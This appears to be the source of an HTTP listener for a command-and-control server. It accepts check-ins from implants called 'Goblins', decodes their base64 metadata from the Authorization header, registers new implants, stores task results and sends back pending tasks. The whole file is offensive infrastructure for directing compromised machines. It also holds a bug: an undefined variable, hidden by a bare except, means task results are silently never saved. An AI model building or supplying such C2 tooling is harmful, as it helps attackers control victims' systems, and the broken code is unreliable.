import asyncio
from aiohttp import web
from teamserver.models import HttpListener, Goblin, GoblinMetadata
from teamserver.serializers import GoblinMetadataSerializer, GoblinTaskSerializer, GoblinTaskResultSerializer
import base64
import json
import multiprocessing
from asgiref.sync import sync_to_async
from django.http import JsonResponse


class HttpListenerManager:
    listeners = {}
    listeners_procs = {}

    @classmethod
    def initialize_listeners(cls):
        http_listeners = HttpListener.objects.all()
        for listener in http_listeners:
            cls.start_listener(listener)

    @classmethod
    def start_listener(cls, listener):
        if listener.id not in cls.listeners:
            http_listener = HttpListener.objects.get(id=listener.id)
            http_listener_instance = cls.create_listener_instance(http_listener)
            cls.listeners[listener.id] = http_listener_instance
            proc = multiprocessing.Process(target=http_listener_instance.start, args=())
            proc.start()
            cls.listeners_procs[listener.id] = proc
            
    @classmethod
    def stop_listener(cls, listener):
        try:
            cls.listeners_procs[listener.id].terminate()
        except:
            print("Listener was not running")

    @classmethod
    def check_state(cls, listener):
        if listener.id not in cls.listeners:
            http_listener = HttpListener.objects.get(id=listener.id)
            http_listener_instance = cls.create_listener_instance(http_listener)
            return http_listener_instance.check_state()

    @classmethod
    def create_listener_instance(cls, http_listener):
        return HttpListenerHandler(http_listener.name, http_listener.port)

class HttpListenerHandler:
    def __init__(self, name, port):
        self.name = name
        self.port = port
        self.runner = self.init_server()
        self.loop = None

    def init_server(self):
        async def handle_implant(request):
            authorization_header = request.headers.get('Authorization')
            if authorization_header:
                try:
                    # Decode the metadata from the Authorization header
                    encoded_metadata = authorization_header.split(' ')[1]
                    decoded_bytes = base64.b64decode(encoded_metadata)
                    decoded_metadata = json.loads(decoded_bytes.decode('utf-8'))

                    # Validate the decoded metadata
                    serializer = GoblinMetadataSerializer(data=decoded_metadata)
                    if await sync_to_async(serializer.is_valid)():
                        goblin_id = serializer.validated_data.get('goblin_id')
                        try:
                            goblin = await sync_to_async(Goblin.objects.get)(id=goblin_id)
                            print(f"Retrieved Goblin: {goblin}")
                        except Goblin.DoesNotExist:
                            metadata = await sync_to_async(serializer.save)()
                            goblin = await sync_to_async(Goblin.objects.create)(id=metadata.goblin_id, metadata=metadata)
                            print("Created new Goblin")

                        request_data = await request.json()
                        print(request_data)
                        try:
                            task_result = request_data.get('taskResults', 'No results found')
                            task_id = request_data.get('taskId', None)
                            task = await sync_to_async(goblin.tasks.get)(id=task_id)
                            task.is_pending = False
                            await sync_to_async(task.save)()
                            result = GoblinTaskResultSerializer(task=task, result=task_results)
                            await sync_to_async(result.save)()
                            
                        except:
                            pass
                        
                        await sync_to_async(goblin.check_in)()
                        tasks = await sync_to_async(goblin.get_pending_tasks)()
                        serializer = GoblinTaskSerializer(tasks, many=True)

                        print(serializer.data)
                        return web.json_response({'tasks': serializer.data})
                    else:
                        print(serializer.errors)
                except Exception as e:
                    print(e)
                    return web.Response(text='Error processing request', status=500)
            return web.Response(text='Unauthorized', status=401)

        app = web.Application()
        app.add_routes([web.post('/', handle_implant)])
        return web.AppRunner(app)

    def start(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.runner.setup())
        listener = web.TCPSite(self.runner, '0.0.0.0', self.port)
        self.loop.run_until_complete(listener.start())
        self.loop.run_forever()
        self.loop.close()
        
                       